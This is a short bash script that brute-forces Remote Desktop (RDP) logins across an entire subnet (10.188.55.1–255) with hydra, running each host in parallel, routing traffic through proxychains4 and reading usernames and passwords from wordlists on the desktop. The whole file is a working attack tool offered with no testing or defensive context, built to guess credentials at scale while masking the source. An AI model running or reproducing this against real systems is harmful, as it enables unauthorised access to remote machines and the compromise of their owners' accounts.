#!/bin/bash
bruter()
{
	
	ip=10.188.55.$1
	echo "------------------------ START $ip ------------------------"
	rm -rf hydra.restore
	proxychains4 hydra -t 3 -W 2 -F -L ~/Desktop/user_hcm.lst -P ~/Desktop/pass_hcm.lst $ip rdp -o rdp.log
	echo "------------------------ FINISH $ip ------------------------"
}
for ip in {1..255}
do
	bruter $ip &
done